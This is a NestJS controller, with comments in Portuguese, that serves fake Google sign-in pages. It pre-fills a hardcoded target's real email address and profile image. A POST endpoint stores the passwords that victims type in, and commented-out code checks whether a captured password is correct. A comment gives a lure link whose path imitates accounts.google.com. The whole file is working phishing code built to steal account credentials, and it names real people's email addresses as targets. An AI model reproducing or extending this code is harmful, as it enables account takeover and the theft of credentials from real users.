import { Controller, Get, Post, Body, Patch, Param, Delete, Render, HttpException, Res } from '@nestjs/common';
import { LoginService } from './login.service';
import { CreateLoginDto } from './dto/create-login.dto';
import { UpdateLoginDto } from './dto/update-login.dto';

@Controller()
export class LoginController {

  //email: string = "Gmail@gmail.com";
  email: string = "rafael.muniz@academico.ifpb.edu.br";
  //email: string = "cdungajr@gmail.com";


  imageDefault: string = "https://lh3.googleusercontent.com/a/default-user=s24-p";

  //IP: string = "localhost";
  //IP: string = "192.168.68.108";
  IP: string = "localhost";

  PORT: string = "3010";
  
  constructor(private readonly loginService: LoginService) {
    //this.loginService.navegadorEsperandoSenhas(this.email);
  }

  // Link para enviar
  // http://192.168.56.1:3000/www.accounts.google.com/#v3/signin/confirmidentifier?dsh=S-955960223%3A1678299953140568&authuser=1&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact%26authuser%3D1%26pageId%3Dnone&passive=1209600&sacu=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHeIjHiQ4LiWBdPcASpyazywqI3j5OaOqghsrN-xdtEfh6h1bfuTwGuOGST5rKRX89l2KBkO
  
  @Get('/')
  //@Redirect('http://www.accounts.google.com/#v3/signin/confirmidentifier?dsh=S-955960223%3A1678299953140568&authuser=1&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Fhl%3Dpt_BR%26utm_source%3DOGB%26utm_medium%3Dact%26authuser%3D1%26pageId%3Dnone&passive=1209600&sacu=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AWnogHeIjHiQ4LiWBdPcASpyazywqI3j5OaOqghsrN-xdtEfh6h1bfuTwGuOGST5rKRX89l2KBkO')

  
  @Get('/www.accounts.google.com')
  @Render('Login_Google1') 
  async html1() {

    // Teste se o usuário já existe
    const result = await this.loginService.existingUser(this.email);

    // Como o retorno é uma lista, se não houver um usuário no índice 0, quer dizer que não foi encontrado um usuário correspondente 
    if (!result[0]){

      // Inicializando a variável da imagem com a do email real
      await this.loginService.emailLogin(this.email);
      this.imageDefault = await this.loginService.getLinkImage()
      console.log("Imagem nova capturada!. Página gerada!")

    } else {

      // Pegando a imagem da primeira ocorrência do usuário no banco
      this.imageDefault = result[0].linkImage;
      console.log("Usuário já encontrado no banco. Página gerada!")
    }

    // Link de suporte: https://docs.nestjs.com/techniques/mvc#template-rendering
    return {
      UserName: this.email,
      imageUser: this.imageDefault,
      IP: this.IP,
      PORT: this.PORT
    }
  }

  @Get('/www.accounts.google.com/v3')
  @Render('Login_Google2')
  html2() {

    //console.log("Do html2: ", this.imageDefault);

    return {
      UserName: this.email,
      imageUser: this.imageDefault, 
      IP: this.IP,
      PORT: this.PORT
    }
  } 
   
  @Post('test')
  async create(@Body() createLoginDto: CreateLoginDto) {
    /*
    
    console.log("\n", createLoginDto);
    
    // Teste se a senha digitada está correta
    const result = await this.loginService.testeSenha(createLoginDto.senha);
    //const result = false;
    
    if(result) {
      
      console.log("Senha correta!!!!!");
      
    } else {
      
      // Tentativa de redirecionamento
      //Render('Login_Google2');
      
    }
    */
    
    return this.loginService.create(createLoginDto);
  } 


  @Patch(':id')
  update(@Param('id') id: string, @Body() updateLoginDto: UpdateLoginDto) {
    return this.loginService.update(+id, updateLoginDto);
  }

  @Delete(':id')
  remove(@Param('id') id: string) {
    return this.loginService.remove(+id);
  }

  // Parou na tentativa de redirecionamento após a pessoa errar a senha.
}
